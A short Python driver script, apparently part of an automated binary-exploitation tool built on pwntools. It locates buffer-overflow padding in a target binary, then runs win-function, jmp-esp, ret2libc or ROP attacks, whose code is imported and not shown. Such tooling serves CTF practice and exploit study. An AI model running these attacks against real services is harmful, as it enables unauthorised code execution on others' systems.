#!/usr/bin/python

# - * -coding: utf - 8 - * -
from helpers import *
from attacks import *
from parse import parse_args
from find_ropgadget import rop_interactive
from pwn import *


if __name__ == "__main__":
    context.log_level = 'error'  # no printing of open/close of each process
    args = parse_args()
    verbose = True if args.verbose == "True" else False

    # ensuring resultfile is empty and writes first part of resultfile
    start_result_file(args.binaryName, args.outfile)

    dprint("---- Starting program... ----", verbose)
    dprint("---- Attempting to Crash Service ----", verbose)
    nPad = find_padding(args.binaryName, args.approxbuffersize - 10,
                        args.pathToOverflow)
    if nPad > 0:
        dprint(f"Overflow is possible with {nPad} bytes of padding", verbose)
    else:
        exit("Overflow not found. Please provide path in configFile if " +
             "path to overflow is known.")

    # attempting different forms of attacks
    padding = args.padChar * nPad
    if args.attack == "winFunction" or args.attack == "all":
        find_goal_function(args.binaryName, padding,
                           args.goalFunction, args.outfile, verbose)
    if args.attack == "jmpEsp" or args.attack == "all":
        jmp_esp(args.binaryName, padding, verbose)
    if args.attack == "ret2libc" or args.attack == "all":
        ret2libc(args.binaryName, padding, args.outfile, verbose)
    if args.attack == "rop" or args.attack == "all":
        rop_interactive(args.binaryName)

        
    finish_result_file(args.binaryName, args.outfile)
